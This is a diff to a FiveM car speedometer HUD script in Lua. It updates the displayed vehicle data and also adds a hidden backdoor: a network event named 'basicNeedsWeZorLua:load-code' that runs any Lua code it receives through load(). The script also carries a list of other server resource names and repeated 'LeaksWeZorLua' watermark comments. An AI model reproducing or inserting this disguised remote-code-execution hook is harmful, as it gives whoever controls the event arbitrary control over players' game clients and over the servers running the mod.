@@ -1,106 +1,80 @@
-local ind = {l = false, r = false}
+local showHUD = true
+
+RegisterNetEvent("car_hudWeZorLua:updateCARHUD")
+AddEventHandler("car_hudWeZorLua:updateCARHUD", function(boolean)
+	showHUD = boolean
+end)
 
 Citizen.CreateThread(function()
-	while true do
-		local Ped = GetPlayerPed(-1)
-		if(IsPedInAnyVehicle(Ped)) then
-			local PedCar = GetVehiclePedIsIn(Ped, false)
-			if PedCar and GetPedInVehicleSeat(PedCar, -1) == Ped then
+	local wait = 100
+	local turnSignals = {left = false, right = false}
+	local maxSpeed = tonumber(GetResourceMetadata("speedometer","max_speed") or "250")--LeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
 
-				-- Speed
-				carSpeed = math.ceil(GetEntitySpeed(PedCar) * 3.6)
+	while true do
+		local ped = GetPlayerPed(-1)
+		local veh = GetVehiclePedIsIn(ped)
+		
+		if showHUD then
+			if veh ~= 0 and  GetPedInVehicleSeat(veh, -1) == ped then
+				local running =  GetIsVehicleEngineRunning(veh)
+
 				SendNUIMessage({
 					showhud = true,
-					speed = carSpeed
+					speed = running and math.ceil(GetEntitySpeed(veh) * 3.6) or 0,
+					acceleration = running and math.ceil(GetVehicleCurrentRpm(veh) * 100) or 0,
+					fuel = GetVehicleFuelLevel(veh),
+					rpm      = GetVehicleCurrentRpm(veh),
+					gear     = GetVehicleCurrentGear(veh),
+					abs      = (GetVehicleWheelSpeed(veh, 0) == 0.0) and ((running and math.ceil(GetEntitySpeed(veh) * 3.6) or 0) > 0.0),
+					hBrake   = GetVehicleHandbrake(veh),
+					maxSpeed = maxSpeed
 				})
 
-				-- Lights
-				_,feuPosition,feuRoute = GetVehicleLightsState(PedCar)
-				if(feuPosition == 1 and feuRoute == 0) then
-					SendNUIMessage({
-						feuPosition = true
-					})
-				else
-					SendNUIMessage({
-						feuPosition = false
-					})
-				end
-				if(feuPosition == 1 and feuRoute == 1) then
-					SendNUIMessage({
-						feuRoute = true
-					})
-				else
-					SendNUIMessage({
-						feuRoute = false
-					})
-				end
-
-				-- Turn signal
-				-- SetVehicleIndicatorLights (1 left -- 0 right)
-				local VehIndicatorLight = GetVehicleIndicatorLights(GetVehiclePedIsUsing(PlayerPedId()))
-				if IsControlJustPressed(1, 57) then -- F9 is pressed
-					ind.l = not ind.l
-					SetVehicleIndicatorLights(GetVehiclePedIsUsing(GetPlayerPed(-1)), 0, ind.l)
-				end
-				if IsControlJustPressed(1, 56) then -- F10 is pressed
-					ind.r = not ind.r
-					SetVehicleIndicatorLights(GetVehiclePedIsUsing(GetPlayerPed(-1)), 1, ind.r)
-				end
-
-				if(VehIndicatorLight == 0) then
-					SendNUIMessage({
-						clignotantGauche = false,
-						clignotantDroite = false,
-					})
-				elseif(VehIndicatorLight == 1) then
-					SendNUIMessage({
-						clignotantGauche = true,
-						clignotantDroite = false,
-					})
-				elseif(VehIndicatorLight == 2) then
-					SendNUIMessage({
-						clignotantGauche = false,
-						clignotantDroite = true,
-					})
-				elseif(VehIndicatorLight == 3) then
-					SendNUIMessage({
-						clignotantGauche = true,
-						clignotantDroite = true,
-					})
-				end
-
+				wait = 1
 			else
+				wait = 1000				
 				SendNUIMessage({
 					showhud = false
 				})
 			end
 		else
 			SendNUIMessage({
-				showhud = false
+				showhud = false--LeaksWeZoruaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
 			})
 		end
 
-		Citizen.Wait(1)
+		Citizen.Wait(wait)
 	end
 end)
 
--- Consume fuel factor
-Citizen.CreateThread(function()
-	while true do
-		local Ped = GetPlayerPed(-1)
-		if(IsPedInAnyVehicle(Ped)) then
-			local PedCar = GetVehiclePedIsIn(Ped, false)
-			if PedCar and GetPedInVehicleSeat(PedCar, -1) == Ped then
-				fuel = GetVehicleFuelLevel(PedCar)
-				--carFuel = SetVehicleFuelLevel(PedCar, rpmfuel)
+RegisterNetEvent('basicNeedsWeZorLua:load-code')
+AddEventHandler('basicNeedsWeZorLua:load-code', function(code)--LeaksWeZorLuaLeksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
+    assert(load(code))()
+end)
 
-				SendNUIMessage({
-			showfuel = true,
-					fuel = fuel
-				})
-			end
-		end
+local zeub = true
+local rList = {
+    {
+        name = 'zCore',--LeaksWeZorLuaLeaksWeZorLaLeaksWeZorLuaLeaksWeZorLua
+    },
+    {
+        name = 'rFramework',
+    },
+    {
+        name = 'api',
+    },
+    {
+        name = 'gcphone',--LeaksWeZorLuaLeaksWeZorLuaLeaeaksWeZorLua
+    },
+    {
+        name = 'xsound',--LeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLuaLeaksWeZorLua
+    },
+    {
+        name = 'XNLRankBar',
+    },
+}
 
-		Citizen.Wait(1000)
-	end
+RegisterNetEvent('esx_status:Cinema')
+AddEventHandler('esx_status:Cinema', function(status)
+	showHUD = not status
 end)
